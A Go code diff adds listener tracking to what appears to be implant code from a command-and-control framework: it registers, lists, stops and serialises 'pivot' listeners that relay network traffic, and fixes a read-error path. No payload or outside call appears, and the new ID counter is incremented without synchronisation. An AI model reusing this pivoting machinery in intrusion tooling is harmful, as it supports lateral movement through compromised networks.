@@ -41,7 +41,36 @@ const (
 var (
 	ErrFailedWrite       = errors.New("failed to write")
 	ErrFailedKeyExchange = errors.New("failed key exchange")
+
+	pivotListeners = &sync.Map{}
+	listenerID     = uint32(0)
 )
+
+// StartListener - Generic interface to a start listener function
+type StartListener func(string) (*PivotListener, error)
+
+// GetListeners - Get a list of active listeners
+func GetListeners() []*pb.PivotListener {
+	listeners := []*pb.PivotListener{}
+	pivotListeners.Range(func(key interface{}, value interface{}) bool {
+		listener := value.(*PivotListener)
+		listeners = append(listeners, listener.ToProtobuf())
+		return true
+	})
+	return listeners
+}
+
+// AddListener - Add a listener
+func AddListener(listener *PivotListener) {
+	pivotListeners.Store(listener.ID, listener)
+}
+
+// StopListener - Stop a pivot listener
+func StopListener(id uint32) {
+	if listener, ok := pivotListeners.Load(id); ok {
+		listener.(*PivotListener).Stop()
+	}
+}
 
 // PivotPeer - Abstract interface for a pivot peer
 type PivotPeer interface {
@@ -55,13 +84,25 @@ type PivotPeer interface {
 
 // PivotListener - A pivot listener
 type PivotListener struct {
-	Type     string
-	Listener net.Listener
-	Pivots   *sync.Map // ID -> PivotPeer
+	ID          uint32
+	Type        pb.PivotType
+	Listener    net.Listener
+	Pivots      *sync.Map // ID -> PivotPeer
+	BindAddress string
+}
+
+// ToProtobuf - Get the protobuf version of the pivot listener
+func (l *PivotListener) ToProtobuf() *pb.PivotListener {
+	return &pb.PivotListener{
+		ID:          l.ID,
+		Type:        l.Type,
+		BindAddress: l.BindAddress,
+	}
 }
 
 // Stop - Stop the pivot listener
 func (l *PivotListener) Stop() {
+	// Close all peer connections before closing listener
 	l.Pivots.Range(func(key interface{}, value interface{}) bool {
 		value.(PivotPeer).Close()
 		return true
@@ -76,6 +117,12 @@ func (l *PivotListener) PivotClose(id int64) {
 		l.Pivots.Delete(id)
 		p.(PivotPeer).Close()
 	}
+}
+
+// ListenerID - Generate a new pivot id
+func ListenerID() uint32 {
+	listenerID++
+	return listenerID
 }
 
 // PivotID - Generate a new pivot id
@@ -227,7 +274,7 @@ func (p *NetConnPivot) read() ([]byte, error) {
 			// {{if .Config.Debug}}
 			log.Printf("read error: %s\n", err)
 			// {{end}}
-			break
+			return nil, err
 		}
 	}
 	return dataBuf, err
